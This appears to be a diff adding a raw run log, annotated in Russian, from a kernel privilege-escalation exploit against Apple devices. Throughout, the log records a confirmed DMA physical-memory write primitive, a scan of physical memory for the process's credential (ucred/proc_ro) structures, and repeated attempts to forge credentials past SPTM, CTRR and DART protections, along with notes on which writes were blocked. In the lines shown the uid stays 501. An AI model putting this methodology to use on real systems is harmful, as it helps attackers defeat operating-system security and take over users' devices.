+    spec-post+0x50: 0x000000066e9dc000
+    spec-post+0x58: 0x0000000000100000
+  [RETRY #1] submit kr=0x0 ctl-changed=1024 слот#0=000000000000000000
+      buffer пост-submit: flags=0xc0 entry0=0x000000040405088d entry1=0x000000040400c147 — ЗАПИСЬ ПРОШЛА — сериализатор прочитал яд ✓ (р.62 подтверждён на железе)
+=== PHYSWRITE DMA CONFIRMED: контрольная страница изменена DMA (1024 dword) — page-list swap до execute РАБОТАЕТ. Дальше форж ucred ===
+  [FORGE] proc_ro=0xffffffdf41f82460 ucred=0xffffffdf41fc87c0 (getuid=501 getgid=501)
+  [FORGE] PAPT сток: tbl=0xfffffff02bd6cc00 n=15
+    stock[0]: 0x00000100082e8000 0xfffffff050000000 0x0000000000076ab8
+  [FORGE] PAPT охота: 11 pointee-кандидатов
+  [FORGE] PAPT найдена @ 0xfffffff02bd6cc00 (fmt=24-B n=15)
+  [FORGE] walker встал на L3 tte=0x1000b8dbf90 — physread через DART
+  [FORGE] leaf PTE = 0x5a5a5a5a5a5a5a5a
+  [PSWAP] p_ucred field: VA=0xffffffdf41f82488 PA=0 (walk deadly — мимо)
+  [PHYSWRITE8v2] target=0x101c86c4000+0 payload=0x0460010142234603 kr=0x0
+  [TBL-TEST] L3[0] нашего proc: readback=000000000000000000 (ждём 0x0460010142234603) → ДРОП (CTRR фенсит и их)
+  [SCAN-Z2] старт: uoff=0x7c0 label=0xc09dffdf41ddacc0 uid=501 roOff=0x2488 ucF=0xffffffdf41fc87c0 frames=0x780b6
+  [SCAN-Z2] скип PA-спаны: SPTM 0x10022af0000..0x10022be4000 TXM 0x10012af0000..0x10012b54000
+  [SCAN-Z2] калибровка из кэша [CAL]: PAPT ✓
+  [SCAN-Z2] whitelist контент-чтений: типы {0x10, 11, 11}, старт idx=0x10000 (PA>=0x10042af0000)
+  [SCAN-Z2] прогресс 0x10000/0x780b6 (чтений 0)
+  [frame-type census] type=0xe (pa=0x10042b10000)
+  [frame-type census] type=0x36 (pa=0x100430f0000)
+  [frame-type census] type=0x35 (pa=0x10043660000)
+  [frame-type census] type=0x18 (pa=0x100437dc000)
+  [frame-type census] type=0x37 (pa=0x10043ecc000)
+  [frame-type census] type=0x34 (pa=0x1004594c000)
+  [frame-type census] type=0x30 (pa=0x10047fc0000)
+  [frame-type census] type=0x17 (pa=0x1005ffe0000)
+  [SCAN-Z2] прогресс 0x18000/0x780b6 (чтений 32768)
+  [frame-type census] type=0x33 (pa=0x10062f1c000)
+  [frame-type census] type=0x31 (pa=0x100630bc000)
+  [frame-type census] type=0x14 (pa=0x10066554000)
+  [frame-type census] type=0x12 (pa=0x1006656c000)
+  [frame-type census] type=0x10 (pa=0x10072c84000)
+  [SCAN-Z2] прогресс 0x20000/0x780b6 (чтений 65536)
+  [SCAN-Z2] ★ proc_ro поле: pa=0x1009c3da488 (p_ucred==ucF + соседи) [тип кадра=24] — PSWAP-B вооружён
+  [SCAN-Z2] прогресс 0x28000/0x780b6 (чтений 98304)
+  [SCAN-Z2] прогресс 0x30000/0x780b6 (чтений 131072)
+  [SCAN-Z2] прогресс 0x38000/0x780b6 (чтений 163840)
+  [SCAN-Z2] прогресс 0x40000/0x780b6 (чтений 196608)
+  [SCAN-Z2] прогресс 0x48000/0x780b6 (чтений 229376)
+  [SCAN-Z2] прогресс 0x50000/0x780b6 (чтений 262144)
+  [frame-type census] type=0x32 (pa=0x10156278000)
+  [SCAN-Z2] прогресс 0x58000/0x780b6 (чтений 294912)
+  [SCAN-Z2] ucred-кандидат pa=0x10166614000: label+uid сошлись, live-сверка — мимо (расхождение @+0)
+  [SCAN-Z2] образец чужого ucred сохранён: pa=0x10166614000 (тип 24) — VMPROBE будет
+  [frame-type census] type=0x2f (pa=0x1017f9cc000)
+  [frame-type census] type=0x38 (pa=0x1017f9d0000)
+  [SCAN-Z2] прогресс 0x60000/0x780b6 (чтений 327680)
+  [SCAN-Z2] прогресс 0x68000/0x780b6 (чтений 360448)
+  [SCAN-Z2] прогресс 0x70000/0x780b6 (чтений 393216)
+  [SCAN-Z2] прогресс 0x78000/0x780b6 (чтений 425984)
+  [SCAN-Z2] финиш: кадров=0x780b6 чтений=426166 ucredPA=0 roFieldPA=0x1009c3da488 — ЦЕЛЬ НАЙДЕНА ★
+  [SCAN-Z2] гистограмма типов (кадров 491702, нет-таблицы 0): 11:338418 14:70625 16:11 17:384 18:1 19:6526 20:5 23:89 24:44 33:9171 47:1 48:9 49:7 50:2 51:8 52:9 53:21 54:40 55:794 56:1
+  [SCAN-Z2-BAND] kernel-проход 256MB..1GB (whitelist + 0x37)
+  [SCAN-Z2-BAND] прогресс 0x4000 (чтений 1)
+  [SCAN-Z2-BAND] прогресс 0x6000 (чтений 8193)
+  [frame-type census] type=0x2e (pa=0x1001f36c000)
+  [SCAN-Z2-BAND] прогресс 0x8000 (чтений 16385)
+  [SCAN-Z2-BAND] прогресс 0xa000 (чтений 24577)
+  [SCAN-Z2-BAND] прогресс 0xc000 (чтений 32769)
+  [SCAN-Z2-BAND] прогресс 0xe000 (чтений 40961)
+  [SCAN-Z2-BAND] финиш: чтений=49152 ucredPA=0 roFieldPA=0x1009c3da488
+  [T18-ENUM] перебор кадров типа 24 из frame table (наш ucred — в зоне этого типа)
+  [frame-type census] type=0x27 (pa=0x10004410000)
+  [frame-type census] type=0x5 (pa=0x10004428000)
+  [frame-type census] type=0x3 (pa=0x10007c00000)
+  [frame-type census] type=0x4 (pa=0x10007d10000)
+  [frame-type census] type=0x2 (pa=0x10007d64000)
+  [frame-type census] type=0x28 (pa=0x10007da4000)
+  [frame-type census] type=0x1 (pa=0x100095dc000)
+  [frame-type census] type=0x29 (pa=0x100095f0000)
+  [frame-type census] type=0x2a (pa=0x100096b4000)
+  [frame-type census] type=0xa (pa=0x100096fc000)
+  [frame-type census] type=0x39 (pa=0x10009784000)
+  [frame-type census] type=0x2c (pa=0x1000978c000)
+  [frame-type census] type=0x2b (pa=0x100097ac000)
+  [frame-type census] type=0x3a (pa=0x100097b0000)
+  [frame-type census] type=0x16 (pa=0x1000bef4000)
+  [frame-type census] type=0x1c (pa=0x1000bff8000)
+  [frame-type census] type=0x1b (pa=0x1000bffc000)
+  [T18-ENUM] кадров типа 24: всего 99, высоких 57, низких 16
+  [T18-ENUM] низкий кандидат[0] pa=0x1000b8d0000
+  [T18-ENUM] низкий кандидат[1] pa=0x1000b8dc000
+  [T18-ENUM] низкий кандидат[2] pa=0x1000bc34000
+  [T18-ENUM] низкий кандидат[3] pa=0x1000bc48000
+  [T18-ENUM] низкий кандидат[4] pa=0x1000bf38000
+  [T18-ENUM] низкий кандидат[5] pa=0x1000bf3c000
+  [T18-ENUM] низкий кандидат[6] pa=0x1000bf40000
+  [T18-ENUM] низкий кандидат[7] pa=0x1000bf48000
+  [T18-ENUM] низкий кандидат[8] pa=0x1000bf4c000
+  [T18-ENUM] низкий кандидат[9] pa=0x1000bf50000
+  [T18-ENUM] низкий кандидат[10] pa=0x1000bf60000
+  [T18-ENUM] низкий кандидат[11] pa=0x1000bf64000
+  [T18-ENUM] низкий кандидат[12] pa=0x1000bf68000
+  [T18-ENUM] низкий кандидат[13] pa=0x1000bf6c000
+  [T18-ENUM] низкий кандидат[14] pa=0x1000bf70000
+  [T18-ENUM] низкий кандидат[15] pa=0x1000bf74000
+  [T18-ENUM] низких 16 — пробуем первый pa=0x1000b8d0000 (список выше для добора)
+  [PSWAP-B] KVA-верификация маркером: papt=✓ linear=✗ → KVA=0xfffffff1609a4000
+  [PSWAP-B] forge page: PA=0x10118c8c000 KVA=0xfffffff1609a4000 → поле 0x1009c3da488
+  [PHYSWRITE8v2] target=0x1009c3d8000+0x2488 payload=0xfffffff1609a4000 kr=0x0
+  [PSWAP-B] запись=kr=0 readback=0xffffffdf41fc87c0 (ждём 0xfffffff1609a4000) → НЕ ПРИЛИПЛО
+  [FORGE] валидация ПРОПУЩЕНА (VMPROBE-on-faith) — INPL пишет и проверяет через readback
+  [FORGE] pageVA=0xffffffdf41fc8000 pagePA=0x1000b8d0000 uoff=0x7c0 — валидация PA: СОШЛАСЬ
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [DART-GATE] physwrite8 PA=0x1000b8d0000 вне окна [0x10042af0000..0x101e2dc8000) — пропуск (иначе DVA 0 / 0x5A-sentinel)
+  [INPL] physwrite8: 00000 | readback cr_uid=501 groups0=501 cr_label=0xc09dffdf41ddacc0 | getuid()=501 getgid()=501
+  [INPL] не прилипло — откат не нужен (контент не изменился), иду в тяжёлый форж
+  [FORGE] DEP-хиты перепатчены на ucredPFN (1 шт)
+  [FORGE] victim#2 submit (ucredPA, fresh pipe): kr=0x0 — жду DMA в ucred
+  [FORGE] getuid()=501 getgid()=501 | cr_uid=501 cr_label=0xc09dffdf41ddacc0
